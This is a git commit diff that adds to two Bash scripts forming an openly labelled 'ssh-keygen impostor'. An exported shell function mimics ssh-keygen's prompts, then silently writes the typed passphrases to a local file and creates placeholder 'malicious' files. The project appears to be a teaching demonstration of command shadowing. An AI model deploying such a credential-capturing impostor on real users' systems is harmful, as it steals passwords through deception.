2f723555e87dbb91f62958b14b336b73ba33a0f3
joekamibeppu <joekamibeppu@gmail.com>
2016-12-14 20:29:14 -0500

    Add storage features to Bash scripts

--- evil_ssh_keygen.sh
+++ evil_ssh_keygen.sh
@@ -1,11 +1,23 @@
 #!/bin/bash
 
+# Bash "ssh-keygen" Command Impostor
+# Joe Kamibeppu | Dec 1 2016
+
+# function that mimics the OpenSSL tool "ssh-keygen"
 ssh-keygen() {
     echo "Generating public/private rsa key pair."
     echo "Enter file in which to save the key (/Users/.ssh/id_rsa): "
-    # some input?
+    read ssh_key_file
     echo "Enter passphrase (empty for no passphrase): "
+    read passphrase_1
     echo "Enter same passphrase again: "
+    read passphrase_2
+    
+    if [ "$passphrase_1" != "$passphrase_2" ]; then
+        echo "Passphrases do not match. Try again."
+        return
+    fi
+
     echo "Your identification has been saved in id_rsa"
     echo "Your public key has been saved in id_rsa.pub"
     echo "The key fingerprint is:"
@@ -22,9 +34,20 @@ ssh-keygen() {
     echo "|      .*.+o      |"
     echo "|      o=+.=o     |"
     echo "+----[SHA256]-----+"
+    
+    # the exported function can create new files and write content to those files
     touch pandoras_box.txt
+    echo "You have opened the box... All of the evils of the world hae been released." >> pandoras_box.txt
+
     touch the_nexus_of_evil.txt
+    echo "The contents of this file could easily have been a worm, a virus or a tini backdoor." >> the_nexus_of_evil.txt
+    
     touch malicious_virus.txt
+    banner "Malicious Content" >> malicious_virus.txt
+    
+    # user may have used sensitive information such as old passwords for the passphrase
+    echo "$passphrase_1" >> sensitive_user_info.txt
+    echo "$passphrase_2" >> sensitive_user_info.txt
 }
 
 export -f ssh-keygen
--- export_ssh_keygen.sh
+++ export_ssh_keygen.sh
@@ -1,3 +1,11 @@
 #!/bin/bash
 
+# Bash "ssh-keygen" Command Impostor
+# Joe Kamibeppu | Dec 1 2016
+
 source ./evil_ssh_keygen.sh
+
+# local storage of a user's sensitive information. 
+# example usage: store a user's passphrases, which may be old passwords or other sensitive information 
+touch sensitive_user_info.txt
+
